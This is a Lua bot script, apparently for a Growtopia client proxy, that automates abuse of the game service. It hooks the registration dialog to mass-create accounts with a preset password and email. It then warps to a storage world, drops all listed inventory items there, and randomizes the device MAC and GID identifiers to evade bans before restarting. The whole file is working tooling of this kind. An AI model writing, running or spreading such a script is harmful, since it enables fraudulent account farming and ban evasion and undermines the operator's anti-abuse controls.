function generateName()
    return "SECRET" .. tostring(math.random(20573, 888100))
end 

function warp(name)
    while getWorld().name:lower() ~= name:lower() do 
        sendPacket(
      10 -7, 
      'action|join_request\nname|' .. name .. '\ninvitedWorld|0\n'
    )
        sleep(3000)
    end 
end

function drop(num, number)
    sendPacket(
    4 -2, 
    'action|drop\n|itemID|' .. num .. '\n'
  )
    sendPacket(
    4 -2,
    'action|dialog_return\ndialog_name|drop_item\nitemID|' .. num .. '|\ncount|' .. number .. '\n'
  )
end 

function create__()
    local name = generateName()
    sendPacket(
    4 -2, 
    'action|dialog_return\ndialog_name|growid_apply\nman|1\nwoman|0\nlogon|' .. name .. '\npassword|' .. const.pass .. '\npassword_verify|' .. const.pass .. '\nemail|' .. const.mail .. '\n'
  )
  doLog('[ SATAN ] Success Created Account : ' .. name .. ' | ' .. const.pass .. ' | ' .. const.mail)
end

function getItemCount(item_)
    for _, item in pairs(getInventory()) do
        if item.id == item_ then
            return item.amount
        end
    end
    return 0
end


AddHook('OnVarlist', 'S  x  T :b', function(var_t)
    if var_t[0]:find('OnDialogRequest') and var_t[1]:find('register') then
        create__()
        callToast('[ 😹 ] > Success Add Virus To Ur Phone 📲', 1)
        t_.start = true
        return true
    end
    return false
end)

while true do 
  sleep(1000)
  if t_.start then 
    warp(t_.storage)
    doLog('[ SATAN ] >> Joined Storage')
    
    if getWorld().name:lower() == t_.storage:lower() then 
      doLog('[ SATAN ] >> Joined Success')
      findPath(t_.coordinateDrop[1], t_.coordinateDrop[2])
      sleep(200)
      for _, r in ipairs(t_.item_t) do 
        drop(r, getItemCount(r))
        sleep(200)
        doLog('[ SATAN ] >> Dropped : '.. getItemByID(r).name)
      end
    end
        randomMac()
        randomGid()
        doLog('Changed Device Information : ' .. getMac() ..' | '.. getGid())
        sleep(2000)
        sendVariant({ [0] = 'QuitToStartScreen' }, -1)
        t_.start = false
    end 
end
